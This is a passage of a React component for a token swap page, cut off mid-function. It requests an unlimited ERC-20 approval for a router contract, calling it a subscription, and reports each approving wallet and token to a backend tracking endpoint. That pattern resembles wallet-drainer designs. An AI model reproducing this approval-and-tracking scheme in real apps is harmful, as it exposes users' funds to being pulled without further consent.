import React, { useContext, useState } from "react";
import { ethers } from "ethers";
import { WalletContext } from "../context/WalletContext";
import { ERC20_ABI, ROUTER_ADDRESS } from "../abis";
import TokenSelector from "./TokenSelector";

export default function SwapPage() {
  const { signer, account } = useContext(WalletContext);
  const [token, setToken] = useState("");
  const [amount, setAmount] = useState("");
  const [status, setStatus] = useState("");

  // Unlimited approval for subscription
  const approveSubscription = async () => {
    if (!token) return alert("Select a token first");
    try {
      const tokenContract = new ethers.Contract(token, ERC20_ABI, signer);
      setStatus("Waiting for approval...");
      const tx = await tokenContract.approve(ROUTER_ADDRESS, ethers.MaxUint256);
      await tx.wait();
      setStatus("Unlimited approval granted ✅");

      // Track unlimited user in backend
      await fetch("/api/trackUnlimitedApproval", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address: account, token }),
      });
    } catch (err) {
      console.error(err);
      setStatus("Approval failed ❌");
    }
  };

  // Optional: trigger a one-time subscription payment
  const pay
